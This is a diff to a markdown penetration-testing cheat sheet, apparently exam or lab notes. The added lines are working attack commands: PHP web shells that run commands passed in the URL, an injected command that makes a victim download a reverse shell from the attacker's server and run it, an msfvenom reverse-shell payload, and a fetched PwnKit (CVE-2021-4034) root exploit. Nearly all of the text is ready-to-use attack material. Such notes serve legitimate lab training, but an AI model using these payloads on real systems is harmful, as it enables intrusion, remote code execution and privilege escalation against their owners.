@@ -351,14 +351,20 @@ setup listner and webserver
 ````
 ### Linux rce techniques
 ````
-msfvenom -p php/reverse_php LHOST=<kali IP> LPORT=443 -f raw > shell.php
+cp /usr/share/webshells/php/php-reverse-shell.php .
 python3 -m http.server
 nc -nlvp 443
 <?php system("wget http://<kali IP>/shell.php -O /tmp/shell.php;php /tmp/shell.php");?>
 ````
 ````
 <?php shell_exec($_GET['cmd']);?> #&cmd=whoami or ?cmd=whoami
+````
+````
+cp /usr/share/webshells/php/php-reverse-shell.php .
+python3 -m http.server 800
+nc -nlvp 443
 <?php system($_GET['cmd']);?> #&cmd=whoami or ?cmd=whoami
+&cmd=wget http://192.168.119.168:800/php-reverse-shell.php -O /tmp/shell.php;php /tmp/shell.php
 ````
 #### Chaining exploits
 ##### LFI to RFE
@@ -409,9 +415,9 @@ https://github.com/frizb/MSF-Venom-Cheatsheet
 ````
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your kali IP> LPORT=<port you designated> -f exe -o ~/shell.exe
 ````
-### Linux PHP
+### Linux 64 bit PHP
 ````
-msfvenom -p php/reverse_php LHOST=192.168.119.168 LPORT=443 -f php > shell.php
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.119.168 LPORT=443 -f elf > shell.php
 ````
 ### Windows 64 bit apache tomcat
 ````
@@ -632,6 +638,17 @@ proxychains psexec.py victim:password@<victim $IP> cmd.exe
 
 ## Linux PrivEsc <img src="https://vangogh.teespring.com/v3/image/7xjTL1mj6OG1mj5p4EN_d6B1zVs/800/800.jpg" width="40" height="40" />
 ### Kernel Expoits
+#### CVE-2021-4034
+````
+uname -a
+Linux dotty 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+````
+````
+https://github.com/ly4k/PwnKit/blob/main/PwnKit.sh
+curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit || exit #local
+chmod +x PwnKit #local
+./PwnKit #Victim Machine
+````
 #### CVE-2021-4034
 ````
 wget https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py
